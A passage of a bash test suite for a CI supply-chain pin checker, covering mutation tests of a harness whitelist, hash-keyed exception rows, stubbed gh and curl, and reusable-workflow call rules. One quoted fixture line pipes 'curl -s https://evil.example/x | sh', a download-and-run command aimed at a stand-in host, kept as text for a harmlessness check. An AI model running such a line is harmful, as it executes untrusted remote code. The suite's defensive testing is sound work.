arg_path_chars + *	HARNESS_WHITELIST["arg_path_chars"] += "*"
arg_path_chars + $	HARNESS_WHITELIST["arg_path_chars"] += "$"
substitutions + ls	HARNESS_WHITELIST["substitutions"]["ls"] = ""
max_args 9 -> 10	HARNESS_WHITELIST["max_args"] = 10
negation + -	HARNESS_WHITELIST["negation"].append("-")
end_of_options not required	HARNESS_WHITELIST["end_of_options"] = ""
pattern may start with -	HARNESS_WHITELIST["pattern_first_char_not"] = ""
grep_options + --file=pats	HARNESS_WHITELIST["grep_options"].append("--file=pats")
dquote_escapes + \-	HARNESS_WHITELIST["dquote_escapes"].append("\\-")
EOF
hfm=$(mktemp -d "$work/hfmut.XXXXXX")
while IFS=$'\t' read -r what patch; do
  python3 - "$work/harness_form.py" "$hfm/m.py" "$patch" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"; assert s.count(m) == 1
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
  python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null; cp "$hfm/e.json" "$hfm/e-$what.json"
  CASE="AC16 harness mutation: widening HARNESS_WHITELIST by one token ($what) is caught (an unexpected acceptance, or a refusal for another reason)"
  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] > 0 or r['wrong_reason'] > 0, r" "$hfm/e.json"
  python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('harness mutation', sys.argv[2] + ':', r['accepted'], 'unexpectedly accepted,', r['wrong_reason'], 'refused for another reason')" "$hfm/e.json" "$what"
done <"$work/hf-mut.tsv"
CASE="AC16 harness mutation: the enumeration reports unexpected acceptances and refusals for a different reason separately (fields accepted and wrong_reason)"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert 'wrong_reason' in r and 'accepted' in r and all('accepted' in d and 'wrong_reason' in d for d in r['classes'].values())" "$work/hf-enum.json"
for m in newline CR; do
  CASE="AC16 harness mutation: line_chars + $m is caught as refusals for a different reason, with 0 unexpected acceptances (the shape still refuses the line)"
  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] == 0 and r['wrong_reason'] > 0, (r['accepted'], r.get('wrong_reason'))" "$hfm/e-line_chars + $m.json"
done
CASE="AC16 harness mutation: the unmutated copy (a no-op patch) is NOT flagged (the mutation run detects widening, not noise)"
python3 - "$work/harness_form.py" "$hfm/m.py" "pass" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] == 0 and r['wrong_reason'] == 0, r" "$hfm/e.json"
CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python source), or only echo/printf/tee/cat/exit/fi with no substitution, or a harness assertion line that harness_form.py accepts"
check python3 - "$root/.github/supply-chain-exceptions.json" "$work/harness_form.py" <<'PY'
import hashlib, json, re, shlex, subprocess, sys
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
LINES = {   # key -> the flattened line of pull request 271 (be20423) the row is written for
    "bdc2f348c4dbc92f8ca94dab85de3c9a9ed425448bfb5bdac5e45f6c233a5bf8": "same-step) printf ' - runs: |\\n curl -s https://evil.example/x | sh\\n' | tee -a \"$work/gr/a.yaml\" >>\"$work/gr/b.yaml\";;",
    "59026aa06d9188a1b90b3ccd57dd0fc2c05bdf90654072b8740477e87155080f": "# uname, curl, git, gh) are replaced by STUBS on PATH that record their argv in a call log; the suite asserts the flags and the",
    "6acbb0aa471b0e3b827df73e7e9c0b3aa3491f7b5c0ff669654a74c868f9794c": "# it writes build/locks/*, archives new packages by digest into ARCHIVE/<arch>/ (curl), verifies them, rewrites lock urls to",
    "77bc505e9228dc4a97d322a7e255a51b972f5087ffc3bf67f167b74b155311d5": "ENVPK = [(\"busybox\", \"1.37.0-r5\"), (\"git\", \"2.50.1-r0\"), (\"wget\", \"1.25.0-r0\"), (\"ca-certificates-bundle\", \"20260102-r0\")]",
    "22312bde0463f438dcaf03137157a7b17959af299e9e30867c442547056c3ecf": "for x in (\"-mod=mod\", \"-mod=readonly\", \"go mod download\", \"go get \", \"curl \", \"GOPROXY=http\", \"GOSUMDB=off\"): assert x not in b, x",
    "5839155d14e99a00fc2d9e031c95573d67aeb3904a33c4d969c74bc4bc6b7541": "assert \"wget\" in names(d[\"environment\"]), \"fetch needs wget in the environment (pipelines/fetch.yaml:4-6)\"",
    "80510e8b8f509a47ab7454a6f43e99a36191fe86249cd876a41a0e7dd9829ac2": "for need in (\"git\", \"busybox\", \"ca-certificates-bundle\", \"wget\"): assert need in names(d[\"environment\"]), need",
    "9f54b594e70eb20f0d0a70ff9277164bd82cc360e18f5b20a78e04f3f13bbf27": "cat >\"$stubs/curl\" <<'EOF'",
    "1314309c3220e61914631f086c3994102c0cbca29603c9e177a888747643d67e": "echo \"curl $*\" >>\"$CALLS\"",
    "64612fb9a9fe82bebee266d20bfd151d4aab8c5a1d02f1a3dfadde2b97938277": "else echo \"stub curl: 22 $url\" >&2; exit 22; fi",
    # the flattened lines of the daily input refresh tests (bin/refresh-inputs-test.sh) the P3 rows are written for
    "2d6db92689368ed648fa331c9bb3331fb4cee877998e1aa7efa34c2a5850e24b": "# url characters, curl flags and caps",
    "bd58928b6ad7d1e1b488524a9ced8ea7cd302651ded5ef4b3976879cec9394e6": "# the live melange resolution moves busybox to 9.9.9-r0: a copy of the live melange lock with that version, and the new apk in the live archive/curl dir",
    "e40f62c4290cc6dcc405320d1b7d8a9ea8092be908d5f84ccd64eb594548b00b": "# ---- P3 review round 2 (Sonnet extras): pointer, certified.txt shape, index tied to the locks, datahash, ranges, curl flags, openssl -----------------------------",
}
SAFE = {"echo", "printf", "tee", "cat", "exit", "fi"}
rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["form"] != "a local reusable workflow call"]   # those name an item, not a text line (AC19)
assert sorted(r["key"] for r in rows) == sorted(LINES), "a committed row has no harmless-line entry in this test (add the line and its reason)"
for r in rows:
    line = LINES[r["key"]]
    segs = re.split(r"\s*(?:;|&&|\|\||\|)\s*", line)
    assert H(line) == r["line"] and r["key"] in {H(s) for s in segs}, r
    if line.startswith("t "):                                            # the harness assertion form: harness_form.py decides, nothing else applies
        hr = subprocess.run([sys.executable, sys.argv[2], line], capture_output=True, text=True, stdin=subprocess.DEVNULL)
        assert hr.returncode == 0 and hr.stdout.startswith("harness assertion"), ("not a harness assertion line", hr.stdout, r)
        continue
    assert not re.search(r"\$\(|`|<\(|>\(|\beval\b|\bsource\b", line), ("a substitution or eval can run anything", r)
    if line.startswith("#"):
        continue                                                         # a comment
    if subprocess.run(["bash", "-n", "-c", line], capture_output=True, stdin=subprocess.DEVNULL).returncode:
        assert re.match(r"^(for \w+ in \(|assert |ENVPK = \[\(|same-step\) |else )", line), ("a syntax error of an unexpected kind", line)
        if not line.startswith(("same-step) ", "else ")):
            continue                                                     # Python source: bash cannot parse it, nothing runs
    lex = shlex.shlex(line, posix=True, punctuation_chars=True); lex.whitespace_split = True; lex.commenters = ""
    cmds, cur = [], []
    for tok in lex:                                                      # quote-aware: a | inside a quoted string is text, not a pipe
        if tok in (";", ";;", "|", "||", "&&", "&"):
            cmds.append(cur); cur = []
        else:
            cur.append(tok)
    cmds.append(cur)
    for c in cmds:
        while c and c[0] in ("else", "then", "do"):
            c = c[1:]
        if len(c) > 1 and c[1] == ")":
            c = c[2:]                                                    # a case pattern: word)
        if c:
            assert c[0] in SAFE, ("not a harmless command", c, r)
PY
# a row the PULL REQUEST brings does nothing: the rulings are read from the base branch (the trusted checkout the script runs from), never from --root
rtrows "$work/rt" "$work/rt-head.json" all
newcase rthead "$(pyw bin/ruled.sh "$rtext")"$'\n'"import shutil; shutil.copy('$work/rt-head.json', '.github/supply-chain-exceptions.json')"
rc=0; python3 "$chk" --root "$work/rthead" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: rows that only the pull request adds (its own .github/supply-chain-exceptions.json) are never read: both lines fail (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
mkdir -p "$work/trusted-gh/agent"; cp -R "$here/../supply-chain" "$work/trusted-gh/agent/supply-chain"
git -C "$work/rthead" show HEAD:.github/supply-chain-exceptions.json >"$work/trusted-gh/supply-chain-exceptions.json"; rc=0
python3 "$work/trusted-gh/agent/supply-chain/pin-age-check.py" --root "$work/rthead" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: the default rulings file is the one beside the checkout the script runs from (CI: trusted/.github/supply-chain-exceptions.json): the same rows there pass (exit 0)"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 2
rm -rf "$work/trusted-gh"
CASE="AC16: the default rulings path is the script's own checkout (.github/supply-chain-exceptions.json beside .github/agent), whatever --root says"
check python3 - "$chk" "$root" <<'PY'
import importlib.util, os, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
assert os.path.realpath(ac.DEFAULT_EXCEPTIONS) == os.path.realpath(os.path.join(sys.argv[2], ".github", "supply-chain-exceptions.json")), ac.DEFAULT_EXCEPTIONS
PY
CASE="AC16: the committed unmeasured_text rows load, and each has exactly file, form, key and line (16 lowercase hex each) and at most a count, a 'text, not a command:' or 'harness assertion:' ruling and no duplicate"
check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
import importlib.util, json, re, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
allrows = json.load(open(sys.argv[2]))["unmeasured_text"]
loaded = ac.load_ruled_text(sys.argv[2], required=True)
assert allrows and len(loaded) == len(allrows), (len(allrows), len(loaded))
calls = [r for r in allrows if r["form"] == "a local reusable workflow call"]    # REQ-SUP-001-AC19: rows that name an item (its whole-identity hash), ruled by the orchestrator
for r in calls:
    assert r["key"] == r["line"] and re.fullmatch(r"[0-9a-f]{64}", r["key"]) and r["file"].startswith(".github/workflows/") and r["ruling"].startswith("local reusable workflow call; "), r
rows = [r for r in allrows if r["form"] != "a local reusable workflow call"]
forms = {"a download"} | {w for _, w in ac.inv._UNMEASURED}
for r in rows:
    assert set(r) - {"count"} == {"file", "form", "key", "line", "ruling"} and (type(r.get("count", 1)) is int and 1 <= r.get("count", 1) <= 100), r
    assert re.fullmatch(r"[0-9a-f]{64}", r["line"]), r
    assert r["file"] and not r["file"].startswith((".github/agent/", "/")) and r["form"] in forms, r
    pre = next((x for x in ("text, not a command: ", "harness assertion: ") if r["ruling"].startswith(x)), None)
    assert re.fullmatch(r"[0-9a-f]{64}", r["key"]) and pre and len(r["ruling"]) > len(pre) + 10, r
PY

# --- live mode (no fixtures) against a stub gh: a rate limit is "could not look" (exit 2), a 404 is "no proof" (exit 1); neither is ever a pass -------------------------
mkdir -p "$work/stubbin"
cat >"$work/stubbin/gh" <<'STUB'
#!/bin/sh
case "$GH_MODE" in
  ratelimit) echo "gh: API rate limit exceeded for user ID 1 (HTTP 403)" >&2; exit 1;;
  notfound)  echo "gh: Not Found (HTTP 404)" >&2; exit 1;;
esac
exit 1
STUB
chmod +x "$work/stubbin/gh"
newcase livea "$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')"
live() { rc=0; ( cd "$work" && env -u GITHUB_REPOSITORY GH_MODE="$1" PATH="$work/stubbin:$PATH" python3 "$chk" --root "$work/livea" --base HEAD~1 --head HEAD --now "$NOW" ) >"$work/live.out" 2>&1 || rc=$?; }
live ratelimit
CASE="live: GitHub's rate limit is 'could not look': exit 2, says so and is not a pass"
check test "$rc" -eq 2; check grep -qi 'rate limit' "$work/live.out"
live notfound
CASE="live: a 404 (no release for that commit) is 'age not provable': exit 1"
check test "$rc" -eq 1; check grep -qi 'not provable' "$work/live.out"

# --- REQ-SUP-001-AC18: bin/install-build-tools.sh, read by the REAL inventory, yields one measured pin per tool and arch (owner/repo@vX.Y.Z with
# its checksum bound) and nothing unmeasured; the variable-address forms it replaced are refused (a placeholder that is not a pin, or unmeasured) -------
cat >"$work/ibt-inv.py" <<'PY'
import importlib.util, os, re, sys
SC = sys.argv[1]
HOST = "https://github.com/"
TOOLS = {"melange": "chainguard-dev/melange", "apko": "chainguard-dev/apko"}
ARCHES = ("amd64", "arm64")
def load(name):
    spec = importlib.util.spec_from_file_location(name.replace("-", "_"), os.path.join(SC, name + ".py"))
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m
def die(msg):
    print("install-build-tools: " + msg); sys.exit(1)
def inventory(path):
    inv = load("pin-inventory"); age = load("pin-age-check")
    text = open(path).read(); f = {"bin/install-build-tools.sh": text}
    um = inv.unmeasured(f)
    if um:
        die("unmeasured: " + "; ".join("%s: %s" % (w, l) for (_, w, l) in sorted(um)))
    vers = {}
    for t in TOOLS:
        m = re.search(re.escape(HOST + TOOLS[t]) + r"/releases/download/v(\d+\.\d+\.\d+)/", text)
        if not m:
            die("no literal release address for " + t)
        vers[t] = m.group(1)
    want = {(TOOLS[t], "v" + vers[t], "%s_%s_linux_%s.tar.gz" % (t, vers[t], a)) for t in TOOLS for a in ARCHES}
    got = set()
    for it in inv.inventory(f).values():
        repo = age.TOOL_REPOS.get(it.name) or (it.name if re.fullmatch(r"[\w.-]+/[\w.-]+", it.name) else None)
        if it.kind != "tool" or not repo or not age.is_pin(it.version) or re.search(r"\$\{|\(variable\)|\(expression\)|\(unmeasured", it.name) or "#" not in it.path:
            die("not a measurable pin with its checksum bound: " + it.key)
        got.add((it.name, it.version, it.path.split("#")[0]))
    if got != want:
        die("measured %s, wanted %s" % (sorted(got), sorted(want)))
    print("measured: " + ", ".join(sorted("%s@%s %s" % g for g in got)))
def mutate(src, out, kind):
    lines = open(src).read().split("\n")
    def edit(label, rx, rep):
        for i, ln in enumerate(lines):
            if re.match(r"^\s*%s\)" % re.escape(label), ln):
                new, k = re.subn(rx, rep, ln, count=1)
                if k == 1:
                    lines[i] = new; return
        print("mutant %s did not apply" % kind); sys.exit(3)
    if kind == "variable":
        edit("melange-amd64", r"/download/v[^/]+/", "/download/v$ver/")
    elif kind == "repovar":
        edit("apko-amd64", re.escape(HOST) + r"[\w.-]+/[\w.-]+/", lambda m: HOST + "$repo/")
    elif kind == "mismatch":
        edit("apko-arm64", r"/download/v(\d+)\.(\d+)\.(\d+)/apko_\d+\.\d+\.\d+_", lambda m: "/download/v{0}.{1}.{2}/apko_{0}.{1}.{2}_".format(m.group(1), m.group(2), int(m.group(3)) + 1))
    else:
        print("unknown mutant " + kind); sys.exit(2)
    open(out, "w").write("\n".join(lines))
{"inventory": lambda: inventory(sys.argv[3]), "mutate": lambda: mutate(sys.argv[3], sys.argv[4], sys.argv[5])}[sys.argv[2]]()
PY
ibt() { python3 "$work/ibt-inv.py" "$here/../supply-chain" "$@" </dev/null >"$work/ibt.out" 2>&1; }
# ibt_refused KIND REGEX [RUNNER]: the inventory command is ibt unless a harness case names a stub as the third argument (never read from the environment)
ibt_refused() { local kind=$1 kw=$2 run=ibt; [ $# -lt 3 ] || run=$3; ibt mutate "$root/bin/install-build-tools.sh" "$work/ibt-$kind.sh" "$kind" || return 1; local rc=0; "$run" inventory "$work/ibt-$kind.sh" || rc=$?
  [ "$rc" -ne 0 ] && [ "$rc" -ne 126 ] && [ "$rc" -ne 127 ] && grep -Eq -- "$kw" "$work/ibt.out"; }   # 126/127: the inventory could not RUN, which is not a refusal
CASE="REQ-SUP-001-AC18: the real inventory measures install-build-tools.sh as 4 pins (melange and apko x amd64 and arm64, owner/repo@vX.Y.Z, checksum bound), nothing unmeasured"
check ibt inventory "$root/bin/install-build-tools.sh"
CASE="REQ-SUP-001-AC18: a variable version in the release address is read as a placeholder, not a pin (pin-age refuses it)"
check ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'
CASE="REQ-SUP-001-AC18: a variable repository in the release address is unmeasured (pin-age refuses it)"
check ibt_refused repovar 'unmeasured: a download'
CASE="REQ-SUP-001-AC18: a URL version that differs from the pinned set is measured as a version outside it"
check ibt_refused mismatch 'wanted'
# the harness itself: a failure to RUN the inventory (exit 126 not executable, 127 not found) is not a refusal, even when the output names the diagnostic
ibt_stub_rc=1 ibt_stub_msg=""
ibt_stub() { [ "$1" = inventory ] || { ibt "$@"; return; }; printf '%s' "$ibt_stub_msg" >"$work/ibt.out"; return "$ibt_stub_rc"; }
# stub_refused RC [OUTPUT]: the stub exits RC after printing OUTPUT (default: the expected diagnostic)
stub_refused() { ibt_stub_rc=$1; ibt_stub_msg=${2-install-build-tools: unmeasured: a download}; ibt_refused repovar 'unmeasured: a download' ibt_stub; }
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with the diagnostic counts as a refusal (the stub stands in correctly)"
check stub_refused 1
CASE="REQ-SUP-001-AC18 harness: an inventory that could not be found (exit 127) is not a refusal, even with the diagnostic"
check eval '! stub_refused 127'
CASE="REQ-SUP-001-AC18 harness: an inventory that could not be executed (exit 126) is not a refusal, even with the diagnostic"
check eval '! stub_refused 126'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with a WRONG diagnostic is not a refusal (the diagnostic is pinned)"
check eval '! stub_refused 1 "install-build-tools: measured something else"'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with EMPTY output is not a refusal (the diagnostic is pinned)"
check eval '! stub_refused 1 ""'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 0 WITH the diagnostic is not a refusal (the nonzero status is pinned)"
check eval '! stub_refused 0'
# the inventory command is never read from the environment: with IBT_RUN exported as a stub that always prints a diagnostic and exits 1,
# the real cases still run the real inventory (the stub's diagnostic never satisfies them, the real one does)
ibt_env_stub() { [ "$1" = inventory ] || { ibt "$@"; return; }; echo "install-build-tools: unmeasured: a download" >"$work/ibt.out"; return 1; }
# iso W H R CMD...: run CMD in a child bash with IBT_RUN exported as the stub; the paths and the command reach the child as ARGUMENTS, never spliced into its script
iso() { IBT_RUN=ibt_env_stub bash -c "$(declare -f ibt ibt_refused ibt_env_stub)"'
work=$1 here=$2 root=$3; shift 3; "$@"' iso-child "$@"; }
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the variable-version mutant still fails on the REAL diagnostic (not a measurable pin)"
check iso "$work" "$here" "$root" ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the stub's diagnostic is not what the variable-version mutant yields"
check iso "$work" "$here" "$root" eval '! ibt_refused variable "unmeasured: a download"'
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the real positive case still passes"
check iso "$work" "$here" "$root" ibt inventory "$root/bin/install-build-tools.sh"
q="$work/it's a dir"; mkdir -p "$q/agent/tests" "$q/root/bin"; cp -R "$here/../supply-chain" "$q/agent/supply-chain"; cp "$root/bin/install-build-tools.sh" "$q/root/bin/"; cp "$work/ibt-inv.py" "$q/"
CASE="REQ-SUP-001-AC18 isolation: under a path with an apostrophe and a space, the real positive case still passes"
check iso "$q" "$q/agent/tests" "$q/root" ibt inventory "$q/root/bin/install-build-tools.sh"
CASE="REQ-SUP-001-AC18 isolation: under a path with an apostrophe and a space, the variable-version mutant still fails on the REAL diagnostic"
check iso "$q" "$q/agent/tests" "$q/root" ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'

# --- REQ-SUP-001-AC19: a local reusable-workflow call (advisor, Oct 14; ops/docs/ratify/2026-10-13-advisor-latitude-costs-and-stale-wording.md, question 2) ---
# The exact form `uses: ./.github/workflows/<name>.yml`, with that file in the tree and read as a workflow, is no item: the called file is inventoried
# itself. Any other local form stays an item that cannot pass. A `with:` that passes a version-shaped value keeps the call an item (the callee may feed
# it to an installer, and nothing in the callee's file would move): refused as before.
cat >"$work/callee.yml" <<EOF
on: workflow_call
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@$SHA1 # v4.1.0
EOF
# lcall NAME USES [WITH-BLOCK]: a copy of base whose head adds .github/workflows/callee.yml and a job `c` in ci.yml calling USES (the pieces travel in files)
lcall() {
  local n=$1 uses=$2 with=${3:-}
  printf '%s' "$uses" >"$work/lcall.uses"; printf '%s' "$with" >"$work/lcall.with"
  newcase "$n" "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
c = w / 'ci.yml'
uses = pathlib.Path(r'$work/lcall.uses').read_text()
with_ = pathlib.Path(r'$work/lcall.with').read_text()
c.write_text(c.read_text() + '  c:\n    uses: ' + uses + '\n' + with_)"
}
lck() { runck "$1" '{"times": {}}'; }
lcall l1 './.github/workflows/callee.yml'
lck l1
CASE="AC19: a call of ./.github/workflows/<name>.yml whose file is in the tree is no item: exit 0 and nothing moved"
check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/l1.out"
lcall l2 './.github/workflows/callee.yml' $'    with:\n      mode: release\n      digests: ${{ needs.j.outputs.digests }}\n'
lck l2
CASE="AC19: ANY with: value keeps the call an item, plain words and expressions included (the closed form: exit 1)"
check test "$rc" -eq 1
lcall l3 './.github/workflows/callee.yml' $'    with:\n      tool-version: 9.9.9\n'
lck l3
CASE="AC19: a with: value that is a version (9.9.9) keeps the call an item that cannot pass: exit 1, the local call is named"
check test "$rc" -eq 1; check grep -q 'action:local:' "$work/l3.out"
lcall l4 './.github/workflows/callee.yml' $'    with:\n      tool-version: ${{ inputs.v || \'9.9.9\' }}\n'
lck l4
CASE="AC19: an expression that holds a version literal inside it keeps the call an item (exit 1)"
check test "$rc" -eq 1; check grep -q 'action:local:' "$work/l4.out"
lcall l5 './.github/workflows/callee.yml' $'    with:\n      pin: v2.17.1\n'
lck l5
CASE="AC19: a v-prefixed version value keeps the call an item (exit 1)"
check test "$rc" -eq 1
lcall l6 './.github/workflows/callee.yml' $'    with:\n      digest: sha256:'"$(printf '7%.0s' $(seq 64))"$'\n'
lck l6
CASE="AC19: a digest value keeps the call an item (exit 1)"
check test "$rc" -eq 1
i=0
for form in './other/callee.yml' './.github/workflows/sub/callee.yml' './.github/workflows/../callee.yml' './.github/workflows/callee.yml@main' './.github/workflows/missing.yml' './.github/workflows/callee.txt' './.github/actions/local'; do
  i=$((i+1)); lcall "lx$i" "$form"; lck "lx$i"
  CASE="AC19: the form '$form' is not the exact local workflow call: it is not exempted (exit 1)"
  check test "$rc" -eq 1
done
newcase lmoved "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text().replace('$SHA1', '$NEW1'))
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: ./.github/workflows/callee.yml\n')"
runck lmoved "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$YOUNG\", \"source\": \"observer\"}}}"
CASE="AC19: the called file is inventoried by its own rules: a young action pin inside it still FAILS (exit 1) though the call itself is no item"
check test "$rc" -eq 1; check grep -q "action:actions/checkout@$NEW1" "$work/lmoved.out"

# --- REQ-SUP-001-AC20: a ruled row for an unpinned package named by a script line (advisor Oct 14: option B; the AC16 mechanism, no parser) ---
# A script line whose pip install names a package with no version is an item that cannot pass. The base branch's exceptions file may rule that line exactly like
# AC16's text lines: {file, form "an unpinned package install", key = line = 64-hex hash of the whole flattened line, ruling[, count]}. Only a script (*.sh)
# outside .github/agent/ can be ruled; the same text in a workflow step, or in a script under .github/agent/, fails as before.
pk_line="       'run: |\\n          bash bin/witnessed.sh apk bin/build-stage-apk.sh\\n          pip install requests'"
pyk() { python3 -c 'import sys; print("import pathlib\npathlib.Path(%r).write_text(%r)" % (sys.argv[1], sys.argv[2]))' "$1" "$2"; }
# pkrows OUT MODE FILE LINE: the exceptions file, hashes computed here, independent of the check
pkrows() {
  python3 - "$1" "$2" "$3" "$4" <<'PY'
import hashlib, json, sys
out, mode, f, line = sys.argv[1:5]
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
h = H(" ".join(line.split()))
row = {"file": f, "form": "an unpinned package install", "key": h, "line": h,
       "ruling": "test fixture: the quoted text is input to a judge test and is never executed; advisor ruling Oct 13"}
rows = [row]
if mode == "none": rows = []
elif mode == "wronghash": row["key"] = row["line"] = ("0" if h[0] != "0" else "1") + h[1:]
elif mode == "wrongfile": row["file"] = "bin/other-test.sh"
elif mode == "wrongform": row["form"] = "a download"
elif mode == "count2": row["count"] = 2
elif mode == "ok": pass
else: raise SystemExit("unknown mode " + mode)
json.dump({"_format": "t", "exceptions": [], "unmeasured_text": rows}, open(out, "w"), indent=2)
PY
}
pkck() { # REPO MODE FILE LINE -> rc, $work/pk.out
  local repo=$1 mode=$2 f=$3 line=$4; pkrows "$work/pk-$repo-$mode.json" "$mode" "$f" "$line"; rc=0
  python3 "$chk" --root "$work/$repo" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --json "$work/pk.json" --exceptions "$work/pk-$repo-$mode.json" >"$work/pk.out" 2>&1 || rc=$?
}
newcase pk "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
$pk_line
")"
pkck pk none bin/judge-test.sh "$pk_line"
CASE="AC20: with no row, the added script line that names an unpinned package fails (exit 1): a pull request that adds one is refused"
check test "$rc" -eq 1
pkck pk ok bin/judge-test.sh "$pk_line"
CASE="AC20: a base-branch row (file, form, key and line hash, ruling) for that exact line passes: exit 0, reported as ruled text with the ruling"
check test "$rc" -eq 0; check grep -q 'ruled text' "$work/pk.out"; check grep -q 'is never executed' "$work/pk.out"
pkck pk wronghash bin/judge-test.sh "$pk_line"
CASE="AC20: a row whose hash is off by one digit does not apply (exit 1)"
check test "$rc" -eq 1
pkck pk wrongfile bin/judge-test.sh "$pk_line"
CASE="AC20: a row for another file does not apply (exit 1)"
check test "$rc" -eq 1
pkck pk wrongform bin/judge-test.sh "$pk_line"
CASE="AC20: a row with another form does not apply (exit 1)"
check test "$rc" -eq 1
newcase pkedit "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
${pk_line/requests/requests2}
")"
pkrows "$work/pk-orig.json" ok bin/judge-test.sh "$pk_line"
rc=0; python3 "$chk" --root "$work/pkedit" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/pk-orig.json" >"$work/pk.out" 2>&1 || rc=$?
CASE="AC20: editing the ruled line voids its row (the whole-line hash changes): exit 1"
check test "$rc" -eq 1
newcase pktwo "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
$pk_line
$pk_line
")"
pkck pktwo ok bin/judge-test.sh "$pk_line"
CASE="AC20: two copies of a line ruled with count 1 fail (exit 1): the row names one occurrence"
check test "$rc" -eq 1
pkck pktwo count2 bin/judge-test.sh "$pk_line"
CASE="AC20: the same two copies ruled with count 2 pass (exit 0)"
check test "$rc" -eq 0
newcase pkwf "
import pathlib
c = pathlib.Path('.github/workflows/ci.yml')
c.write_text(c.read_text() + '      - run: pip install requests\n')"
pkck pkwf ok .github/workflows/ci.yml "      - run: pip install requests"
CASE="AC20: the same package text in a WORKFLOW step cannot be ruled (a row for the workflow file does not apply): exit 1"
check test "$rc" -eq 1
newcase pkpinned "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
pip install fixture-pkg==3.1.4 --hash=sha256:aaaa
")"
rc=0; python3 "$chk" --root "$work/pkpinned" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/pk.out" 2>&1 || rc=$?
CASE="AC20: a pinned package line is not an unpinned-package occurrence: no row is asked for (the pin itself is measured as before: exit 1, no fixture age)"
check test "$rc" -eq 1; check grep -q 'pypi/fixture-pkg@3.1.4' "$work/pk.out"
newcase pkff "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
$(printf 'pip install requests\f')
")"
pkck pkff ok bin/judge-test.sh "pip install requests"
CASE="AC20: a line holding whitespace other than space or tab (a form feed) can never be ruled: exit 1"
check test "$rc" -eq 1

# --- round 1 of the review of PR 329 (both seats held): the exact boundary of AC19, the line identity of AC20, and AC3's fractional second ------------------
# lcallc NAME USES [WITH] [CALLEE-TEXT-FILE]: like lcall, with the callee's text taken from a file; and as a STEP rather than a job when NAME starts with step
lcallc() {
  local n=$1 uses=$2 with=${3:-} callee=${4:-$work/callee.yml}
  printf '%s' "$uses" >"$work/lcall.uses"; printf '%s' "$with" >"$work/lcall.with"
  newcase "$n" "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$callee').read_text())
c = w / 'ci.yml'
uses = pathlib.Path(r'$work/lcall.uses').read_text()
with_ = pathlib.Path(r'$work/lcall.with').read_text()
c.write_text(c.read_text() + '  c:\n    uses: ' + uses + '\n' + with_)"
}
lcallc m1 './.github/workflows/callee.yaml'
lck m1
CASE="AC19: the .yaml spelling is not the exact form: not exempted (exit 1)"
check test "$rc" -eq 1
lcallc m2 './.github/workflows/ca..llee.yml'
lck m2
CASE="AC19: a name holding .. is not the plain form: not exempted (exit 1)"
check test "$rc" -eq 1
newcase mstep "
import pathlib
w = pathlib.Path('.github/workflows')
